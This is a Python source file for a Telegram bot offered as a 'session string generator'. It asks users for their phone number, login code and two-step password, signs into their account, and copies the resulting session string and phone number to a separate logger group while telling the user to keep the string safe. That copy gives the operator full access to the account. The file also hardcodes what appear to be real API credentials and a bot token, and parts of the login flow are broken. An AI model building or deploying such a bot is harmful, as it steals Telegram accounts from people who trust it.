from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.errors import SessionPasswordNeeded
from io import BytesIO
import requests

# Replace with your values

API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7767480564:AAGwzQ1wDQ8Qkdd9vktp8zW8aUOitT9fAFc"  

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706


user_sessions = {}  # Dictionary to store user session data

# Initialize the Pyrogram bot
bot = Client("session_generator_bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

# Handle /start command
@bot.on_message(filters.command("start"))
async def start(client, message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = {"step": "phone"}  # Initialize the session

    # Sending a welcome message with an image and buttons
    image_url = "https://your_image_url_here.jpg"  # Replace with your image URL
    image = BytesIO(requests.get(image_url).content)  # Download image

    await message.reply_photo(
        image,
        caption="**Welcome! Please enter your phone number to get started.**\n\n"
                "To begin, I will need your phone number. Once you provide it, you'll receive an OTP to continue.",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel"),
                 InlineKeyboardButton("📚 Help", callback_data="help"),
                 InlineKeyboardButton("🔑 Generate Session String", callback_data="generate_session")]
            ]
        )
    )

# Handle "Generate Session String" button click
@bot.on_callback_query(filters.regex('generate_session'))
async def generate_session(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in user_sessions:
        await callback_query.message.edit("**❖ You have not started the process. Please type /start first.**")
        return

    # If session hasn't started, ask for phone number
    if user_sessions[user_id]["step"] != "phone":
        await callback_query.message.edit("**❖ Please enter your phone number first.**")
        return

    await callback_query.message.edit("**❖ Please enter your phone number to start the session generation process.**")

# Process User Input (Phone Number and OTP)
@bot.on_message(filters.text)
async def process_input(client, message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        return  # If the user session doesn't exist, return

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        # Create a new Pyrogram client for each user session
        client_instance = Client("user_session", api_id=API_ID, api_hash=API_HASH)
        await client_instance.start(phone_number)
        user_sessions[user_id]["client"] = client_instance

        try:
            # Send OTP code
            await client_instance.send_code_request(phone_number)
            user_sessions[user_id]["step"] = "otp"
            await message.reply("**❖ OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            await message.reply(f"**❖ Error:** {str(e)}. Please try again!")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = message.text.strip()
        client_instance = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            # Handle two-step verification
            await client_instance.sign_in(phone_number, otp_code)

            user_sessions[user_id]["step"] = "password"
            await message.reply("**❖ Two-step verification is enabled! Please enter your Telegram password.**")
        except SessionPasswordNeeded:
            # If two-step verification is enabled
            await message.reply("**❖ Two-step verification is enabled! Please enter your Telegram password.**")
            user_sessions[user_id]["step"] = "password"

    # ✅ Step 3: Enter Password (for two-step verification)
    elif step == "password":
        password = message.text.strip()
        client_instance = user_sessions[user_id]["client"]

        try:
            await client_instance.sign_in(password=password)  # Sign in with password
            session_string = client_instance.export_session_string()  # Generate session string

            # Optionally, log the session in a group
            if LOGGER_GROUP_ID:
                await client.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated!**\n\n**◍ User:** `{user_id}`\n**◍ Phone:** `{user_sessions[user_id]['phone']}`\n**◍ Session:** `{session_string}`")

            await message.reply(f"**❖ Your session string:**\n\n`{session_string}`\n\n**◍ Keep this safe!**")
            
            # Clear the user session after generation
            del user_sessions[user_id]

        except Exception as e:
            await message.reply(f"**❖ Error:** {str(e)}. Please try again!")
            # Clear the user session after error
            del user_sessions[user_id]

# Handle /cancel command
@bot.on_callback_query(filters.regex('cancel'))
async def cancel(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]  # Clear session data

    await callback_query.message.edit("**❖ Process cancelled.**", reply_markup=None)

# Handle /help command
@bot.on_callback_query(filters.regex('help'))
async def help(client, callback_query):
    await callback_query.message.edit(
        "**Help Guide:**\n\n"
        "1. First, you need to provide your phone number.\n"
        "2. After that, you'll receive an OTP to confirm your phone number.\n"
        "3. Once verified, I'll generate a session string for you.\n"
        "4. If two-step verification is enabled, please enter your Telegram password.\n"
        "5. Keep the session string safe for later use.\n\n"
        "You can always cancel the process using the Cancel button.",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
        )
    )

# Start the bot
bot.run()
